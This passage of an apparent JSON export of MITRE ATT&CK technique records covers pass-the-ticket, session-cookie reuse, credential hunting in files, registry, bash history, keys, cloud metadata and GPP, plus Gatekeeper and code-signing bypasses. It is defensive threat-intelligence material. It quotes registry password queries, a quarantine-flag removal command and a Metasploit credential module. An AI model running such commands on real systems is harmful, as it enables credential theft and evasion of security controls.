    "technique_description": "<p>Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account’s password. Kerberos authentication can be used as the first step to lateral movement to a remote system.<!-- raw HTML omitted --><!-- raw HTML omitted -->In this technique, valid Kerberos tickets for <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> are captured by <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>. A user’s service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/techniques/T1558/002\">Silver Ticket</a> can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/techniques/T1558/001\">Golden Ticket</a> can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/645.html",
        "description": "none",
        "external_id": "CAPEC-645"
      },
      {
        "source_name": "ADSecurity AD Kerberos Attacks",
        "url": "https://adsecurity.org/?p=556",
        "description": "Metcalf, S. (2014, November 22). Mimikatz and Active Directory Kerberos Attacks. Retrieved June 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "GentilKiwi Pass the Ticket",
        "url": "http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos",
        "description": "Deply, B. (2014, January 13). Pass the ticket. Retrieved June 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Campbell 2014",
        "url": "http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf",
        "description": "Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December 4, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "CERT-EU Golden Ticket Protection",
        "url": "https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf",
        "description": "Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926",
    "platform": "windows",
    "tid": "T1550.003",
    "technique": "Pass the Ticket",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account’s password. Kerberos authentication can be used as the first step to lateral movement to a remote system.<!-- raw HTML omitted --><!-- raw HTML omitted -->In this technique, valid Kerberos tickets for <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> are captured by <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>. A user’s service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/techniques/T1558/002\">Silver Ticket</a> can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/techniques/T1558/001\">Golden Ticket</a> can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/645.html",
        "description": "none",
        "external_id": "CAPEC-645"
      },
      {
        "source_name": "ADSecurity AD Kerberos Attacks",
        "url": "https://adsecurity.org/?p=556",
        "description": "Metcalf, S. (2014, November 22). Mimikatz and Active Directory Kerberos Attacks. Retrieved June 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "GentilKiwi Pass the Ticket",
        "url": "http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos",
        "description": "Deply, B. (2014, January 13). Pass the ticket. Retrieved June 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Campbell 2014",
        "url": "http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf",
        "description": "Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December 4, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "CERT-EU Golden Ticket Protection",
        "url": "https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf",
        "description": "Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0",
    "platform": "office-365|saas",
    "tid": "T1550.004",
    "technique": "Web Session Cookie",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs|office-365-audit-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)<!-- raw HTML omitted --><!-- raw HTML omitted -->Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through <a href=\"https://attack.mitre.org/techniques/T1539\">Steal Web Session Cookie</a>, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.<!-- raw HTML omitted --><!-- raw HTML omitted -->There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/60.html",
        "description": "none",
        "external_id": "CAPEC-60"
      },
      {
        "source_name": "Pass The Cookie",
        "url": "https://wunderwuzzi23.github.io/blog/passthecookie.html",
        "description": "Rehberger, J. (2018, December). Pivot to the Cloud using Pass the Cookie. Retrieved April 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Mac Crypto Cookies January 2019",
        "url": "https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/",
        "description": "Chen, Y., Hu, W., Xu, Z., et. al.. (2019, January 31). Mac Malware Steals Cryptocurrency Exchanges’ Cookies. Retrieved October 14, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0",
    "platform": "office-365|saas",
    "tid": "T1550.004",
    "technique": "Web Session Cookie",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs|office-365-audit-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)<!-- raw HTML omitted --><!-- raw HTML omitted -->Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through <a href=\"https://attack.mitre.org/techniques/T1539\">Steal Web Session Cookie</a>, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.<!-- raw HTML omitted --><!-- raw HTML omitted -->There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/60.html",
        "description": "none",
        "external_id": "CAPEC-60"
      },
      {
        "source_name": "Pass The Cookie",
        "url": "https://wunderwuzzi23.github.io/blog/passthecookie.html",
        "description": "Rehberger, J. (2018, December). Pivot to the Cloud using Pass the Cookie. Retrieved April 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Mac Crypto Cookies January 2019",
        "url": "https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/",
        "description": "Chen, Y., Hu, W., Xu, Z., et. al.. (2019, January 31). Mac Malware Steals Cryptocurrency Exchanges’ Cookies. Retrieved October 14, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc",
    "platform": "linux|macos|windows|aws|gcp|azure",
    "tid": "T1552.001",
    "technique": "Credentials In Files",
    "tactic": "credential-access",
    "datasources": "file-monitoring|process-command-line-parameters",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.<!-- raw HTML omitted --><!-- raw HTML omitted -->It is possible to extract passwords from backups or saved virtual machines through <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>. (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)<!-- raw HTML omitted --><!-- raw HTML omitted -->In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/639.html",
        "description": "none",
        "external_id": "CAPEC-639"
      },
      {
        "source_name": "CG 2014",
        "url": "http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html",
        "description": "CG. (2014, May 20). Mimikatz Against Virtual Machine Memory Part 1. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "SRD GPP",
        "url": "http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx",
        "description": "Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "Specter Ops - Cloud Credential Storage",
        "url": "https://posts.specterops.io/head-in-the-clouds-bd038bb69e48",
        "description": "Maddalena, C.. (2018, September 12). Head in the Clouds. Retrieved October 4, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580",
    "platform": "windows",
    "tid": "T1552.002",
    "technique": "Credentials in Registry",
    "tactic": "credential-access",
    "datasources": "process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.<!-- raw HTML omitted --><!-- raw HTML omitted -->Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)<!-- raw HTML omitted --><!-- raw HTML omitted -->* Local Machine Hive: <!-- raw HTML omitted -->reg query HKLM /f password /t REG_SZ /s<!-- raw HTML omitted --><!-- raw HTML omitted -->* Current User Hive: <!-- raw HTML omitted -->reg query HKCU /f password /t REG_SZ /s<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Pentestlab Stored Credentials",
        "url": "https://pentestlab.blog/2017/04/19/stored-credentials/",
        "description": "netbiosX. (2017, April 19). Stored Credentials. Retrieved April 6, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8187bd2a-866f-4457-9009-86b0ddedffa3",
    "platform": "linux|macos",
    "tid": "T1552.003",
    "technique": "Bash History",
    "tactic": "credential-access",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the “history” utility. Once a user logs out, the history is flushed to the user’s <!-- raw HTML omitted -->.bash_history<!-- raw HTML omitted --> file. For each user, this file resides at the same location: <!-- raw HTML omitted -->~/.bash_history<!-- raw HTML omitted -->. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)</p>\n",
    "technique_references": [
      {
        "source_name": "External to DA, the OS X Way",
        "url": "http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way",
        "description": "Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf",
    "platform": "linux|macos|windows",
    "tid": "T1552.004",
    "technique": "Private Keys",
    "tactic": "credential-access",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also look in common key directories, such as <!-- raw HTML omitted -->~/.ssh<!-- raw HTML omitted --> for SSH keys on * nix-based systems or <!-- raw HTML omitted -->C:\\Users\\(username)\\.ssh\\<!-- raw HTML omitted --> on Windows. These private keys can be used to authenticate to <a href=\"https://attack.mitre.org/techniques/T1021\">Remote Services</a> like SSH or for use in decrypting other collected files such as email.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)<!-- raw HTML omitted --><!-- raw HTML omitted -->Some private keys require a password or passphrase for operation, so an adversary may also use <a href=\"https://attack.mitre.org/techniques/T1056\">Input Capture</a> for keylogging or attempt to <a href=\"https://attack.mitre.org/techniques/T1110\">Brute Force</a> the passphrase off-line.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Public Key Crypto",
        "url": "https://en.wikipedia.org/wiki/Public-key_cryptography",
        "description": "Wikipedia. (2017, June 29). Public-key cryptography. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky Careto",
        "url": "https://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf",
        "description": "Kaspersky Labs. (2014, February 11). Unveiling “Careto” - The Masked APT. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Palo Alto Prince of Persia",
        "url": "https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/",
        "description": "Bar, T., Conant, S., Efraim, L. (2016, June 28). Prince of Persia – Game Over. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
    "platform": "aws|gcp|azure",
    "tid": "T1552.005",
    "technique": "Cloud Instance Metadata API",
    "tactic": "credential-access",
    "datasources": "authentication-logs|aws-cloudtrail-logs|azure-activity-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.<!-- raw HTML omitted --><!-- raw HTML omitted -->Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->The de facto standard across cloud service providers is to host the Instance Metadata API at <!-- raw HTML omitted -->http[:]//169.254.169.254<!-- raw HTML omitted -->.<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "AWS Instance Metadata API",
        "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html",
        "description": "AWS. (n.d.). Instance Metadata and User Data. Retrieved July 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Krebs Capital One August 2019",
        "url": "https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/",
        "description": "Krebs, B.. (2019, August 19). What We Can Learn from the Capital One Hack. Retrieved March 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "RedLock Instance Metadata API 2018",
        "url": "https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse",
        "description": "Higashi, Michael. (2018, May 15). Instance Metadata API: A Modern Day Trojan Horse. Retrieved July 16, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e",
    "platform": "windows",
    "tid": "T1552.006",
    "technique": "Group Policy Preferences",
    "tactic": "credential-access",
    "datasources": "process-command-line-parameters|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)<!-- raw HTML omitted --><!-- raw HTML omitted -->These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)<!-- raw HTML omitted --><!-- raw HTML omitted -->The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:<!-- raw HTML omitted --><!-- raw HTML omitted -->* Metasploit’s post exploitation module: <!-- raw HTML omitted -->post/windows/gather/credentials/gpp<!-- raw HTML omitted --><!-- raw HTML omitted -->* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)<!-- raw HTML omitted -->* gpprefdecrypt.py<!-- raw HTML omitted --><!-- raw HTML omitted -->On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <!-- raw HTML omitted -->dir /s * .xml<!-- raw HTML omitted --><!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft GPP 2016",
        "url": "https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v%3Dws.11)",
        "description": "Microsoft. (2016, August 31). Group Policy Preferences. Retrieved March 9, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GPP Key",
        "url": "https://msdn.microsoft.com/library/cc422924.aspx",
        "description": "Microsoft. (n.d.). 2.2.1.1.4 Password Encryption. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Obscuresecurity Get-GPPPassword",
        "url": "https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html",
        "description": "Campbell, C. (2012, May 24). GPP Password Retrieval with PowerShell. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity Finding Passwords in SYSVOL",
        "url": "https://adsecurity.org/?p=2288",
        "description": "Sean Metcalf. (2015, December 28). Finding Passwords in SYSVOL & Exploiting Group Policy Preferences. Retrieved February 17, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--31a0a2ac-c67c-4a7e-b9ed-6a96477d4e8e",
    "platform": "macos",
    "tid": "T1553.001",
    "technique": "Gatekeeper Bypass",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls. In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called <!-- raw HTML omitted -->com.apple.quarantine<!-- raw HTML omitted -->. This attribute is read by Apple’s Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. <!-- raw HTML omitted --><!-- raw HTML omitted -->Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, it is possible to avoid setting this flag using <a href=\"https://attack.mitre.org/techniques/T1189\">Drive-by Compromise</a>. This completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware Persistence) The presence of the quarantine flag can be checked by the xattr command <!-- raw HTML omitted -->xattr /path/to/MyApp.app<!-- raw HTML omitted --> for <!-- raw HTML omitted -->com.apple.quarantine<!-- raw HTML omitted -->. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, <!-- raw HTML omitted -->sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app<!-- raw HTML omitted -->. (Citation: Clearing quarantine attribute) (Citation: OceanLotus for OS X)<!-- raw HTML omitted --> <!-- raw HTML omitted -->In typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)</p>\n",
    "technique_references": [
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Clearing quarantine attribute",
        "url": "https://derflounder.wordpress.com/2012/11/20/clearing-the-quarantine-extended-attribute-from-downloaded-applications/",
        "description": "Rich Trouton. (2012, November 20). Clearing the quarantine extended attribute from downloaded applications. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OceanLotus for OS X",
        "url": "https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update",
        "description": "Eddie Lee. (2016, February 17). OceanLotus for OS X - an Application Bundle Pretending to be an Adobe Flash Update. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Bypassing Gatekeeper",
        "url": "https://blog.malwarebytes.com/cybercrime/2015/10/bypassing-apples-gatekeeper/",
        "description": "Thomas Reed. (2016, March 31). Bypassing Apple's Gatekeeper. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082",
    "platform": "macos|windows",
    "tid": "T1553.002",
    "technique": "Code Signing",
    "tactic": "defense-evasion",
    "datasources": "binary-file-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike <a href=\"https://attack.mitre.org/techniques/T1036/001\">Invalid Code Signature</a>, this activity will result in a valid signature.<!-- raw HTML omitted --><!-- raw HTML omitted -->Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing) <!-- raw HTML omitted --><!-- raw HTML omitted -->Code signing certificates may be used to bypass security policies that require signed code to execute on a system.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Code Signing",
        "url": "https://en.wikipedia.org/wiki/Code_signing",
        "description": "Wikipedia. (2015, November 10). Code Signing. Retrieved March 31, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Securelist Digital Certificates",
        "url": "https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/",
        "description": "Ladikov, A. (2015, January 29). Why You Shouldn’t Completely Trust Files Signed with Digital Certificates. Retrieved March 31, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec Digital Certificates",
        "url": "http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates",
        "description": "Shinotsuka, H. (2013, February 22). How Attackers Steal Private Keys from Digital Certificates. Retrieved March 31, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--543fceb5-cb92-40cb-aacf-6913d4db58bc",
    "platform": "windows",
    "tid": "T1553.003",
    "technique": "SIP and Trust Provider Hijacking",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|application-logs|dll-monitoring|loaded-dlls|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file’s origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Similar to <a href=\"https://attack.mitre.org/techniques/T1116\">Code Signing</a>, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->* Modifying the <!-- raw HTML 